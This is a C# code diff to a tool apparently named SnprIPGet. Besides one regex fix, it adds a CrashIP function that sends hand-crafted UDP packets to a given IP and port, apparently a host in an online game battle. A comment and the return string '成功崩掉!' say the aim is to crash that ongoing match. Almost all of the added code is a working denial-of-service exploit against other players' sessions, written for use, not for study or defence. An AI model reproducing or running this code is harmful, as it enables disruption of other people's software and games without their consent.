@@ -73,7 +73,7 @@ namespace SnprIPGet
 
                     tmp=GetIPInfo(LineId, mat);
                     if (tmp == "") continue;//如果是空的则不执行下面的代码
-                    rcstr = Regex.Match(str, @"([^ ]+?)[ ]*使").Result("$1");
+                    rcstr = Regex.Match(tmp, "([^ ]+?)[ ]*\t").Result("$1");
                     fndFlag = false;
                     for (int i = 0; i < ipArr.Count;++i)
                     {
@@ -420,5 +420,135 @@ namespace SnprIPGet
             ptarget.Close();
             return "Unavailable";
         }
+        public static string CrashIP(string str)
+        {
+            Match mat = Regex.Match(str, "([0-9]+).([0-9]+).([0-9]+).([0-9]+):(.+)");
+            byte[] ipArr = new byte[4];
+            Random r = new Random();
+            int i;
+            IPAddress addr;
+            try
+            {
+                for (i = 1; i < 5; ++i)
+                {
+                    ipArr[i - 1] = byte.Parse(mat.Result("$" + i));
+                }
+                addr = new IPAddress(ipArr);
+            }
+            catch (Exception)
+            {
+                return "Unavailable-Invaild IP";
+            }
+            int port = int.Parse(mat.Result("$5"));
+            UdpClient ptarget = null;
+            for (int tmp = 0; tmp < 10; tmp++)
+            {
+                try
+                {
+                    ptarget = new UdpClient(r.Next(10000, 30000));
+                }
+                catch (Exception)
+                {
+                    //Skip This Exception
+                }
+                if (ptarget != null) break;
+            }
+            if (ptarget == null) return "Unavailable- Can't Bind to a Port";
+            List<Socket> sk = new List<Socket>();
+            Byte[] pingdata = new Byte[24]
+            {
+                0x08,0x57,0x09,0xf6,0x67,0xf0,0xfd,0x4b,
+                0xd0,0xb9,0x9a,0x74,0xf8,0x38,0x33,0x81,
+                0x88,0x00,0x00,0x00,0xa4,0x7d,0x12,0x00
+            };
+            pingdata[20] = (Byte)r.Next(0, 255);
+            pingdata[21] = (Byte)r.Next(0, 255);
+            pingdata[22] = (Byte)r.Next(0, 255);
+            Byte[] querybattle = new Byte[110]
+            {
+                0x09,0x57,0x09,0xf6,0x67,0xf0,0xfd,0x4b,0xd0,0xb9,0x9a,0x74,0xf8,
+                0x38,0x33,0x81,0x88,0x00,0x00,0x00,0x56,0xc2,0x51,0x01,0x00,0x00,
+                0x00,0x00,0x00,0x00,0x4a,0x00,0x4a,0x00,0x00,0x01,0x4b,0x00,0x00,
+                0x00,0x78,0x9c,0x13,0x60,0x60,0xe0,0xe0,0x60,0x60,0x60,0xc8,0x2c,
+                0x8e,0x2f,0x4f,0x2c,0x49,0xce,0x00,0xb2,0x19,0x19,0x05,0x80,0x82,
+                0xec,0x40,0xc1,0xb2,0xd4,0xa2,0xe2,0xcc,0xfc,0x3c,0x26,0x06,0x06,
+                0x56,0x71,0x15,0x31,0x06,0x90,0x30,0x37,0x50,0x38,0x23,0x33,0x25,
+                0x25,0x35,0x2f,0x3e,0x39,0x23,0xb1,0x08,0x24,0x05,0x52,0xc9,0x08,
+                0x44,0x00,0xc6,0xa8,0x0b,0x96
+            };
+            Byte[] disconnect = new byte[12]
+            {
+                0x10,0x07,0x16,0x01,0xe3,0x80,0x0f,0x00,0x02,0x00,0x00,0x00
+            };
+            int before = Environment.TickCount;
+            try
+            {
+                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
+                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
+                ptarget.Send(pingdata, 24, new IPEndPoint(addr, port));
+            }
+            catch(Exception)
+            {
+                return "Unavailable";
+            }
+            sk.Add(ptarget.Client);
+            Socket.Select(sk, null, null, (int)2 * 1000);
+            int currentdelay = Environment.TickCount - before;
+            IPEndPoint ipe = new IPEndPoint(0, 0);
+            bool crushflag = false;
+            try
+            {
+                for (; ; )
+                {
+                    ptarget.Client.ReceiveTimeout = 200;
+                    byte[] rdata = ptarget.Receive(ref ipe);
+                    if (rdata.Length == 1 && rdata[0] == 4)
+                    {
+                        //ptarget.Close();
+                        //return true;
+                        ptarget.Send(querybattle, 110, new IPEndPoint(addr, port));
+                        continue;
+                    }
+                    else if (rdata.Length == 32 && rdata[0] == 7)//Ping包?
+                    {
+                        //禁止的情况不会有这种ping包
+                        //ptarget.Send(disconnect, 12, new IPEndPoint(addr, port));
+                        //ptarget.Close();
+                        //return "可以观战";
+                        ptarget.Send(rdata, 32, new IPEndPoint(addr, port));
+                        crushflag = true;
+                        //ptarget.Close();
+                        //return "成功崩掉!";
+                        continue;
+                    }
+                    else if (rdata.Length == 32 && rdata[0] == 0x0c)
+                    {
+                        ptarget.Close();
+                        return "观战不能";
+                    }
+                    else if (rdata.Length == 92 && rdata[0] == 0x0b)
+                    {
+                        ptarget.Send(disconnect, 12, new IPEndPoint(addr, port));
+                        ptarget.Close();
+                        return "可以观战";
+                    }
+                    break;
+                }
+            }
+            catch (Exception e)
+            {
+                ptarget.Close();
+                if (crushflag) return "成功崩掉!";
+                return "Unavailable";
+            }
+            ptarget.Close();
+            //return "成功崩掉!";
+            return "Unavailable";
+        }
     }
+
+    /*
+     * 崩了这个正在对战的ip!
+     */
+    
 }
